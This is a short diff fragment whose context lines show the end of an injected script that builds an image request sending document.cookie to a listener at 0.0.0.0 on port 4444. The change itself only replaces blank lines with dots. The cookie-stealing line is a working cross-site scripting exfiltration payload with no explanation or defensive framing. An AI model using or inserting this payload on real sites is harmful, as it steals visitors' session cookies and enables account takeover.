@@ -3,7 +3,12 @@ var i = new Image;
 i.src = "http://0.0.0.0:4444/?" + document.cookie;
 </script>
 
-
+.
+.
+.
+.
+.
+.
 
 
 
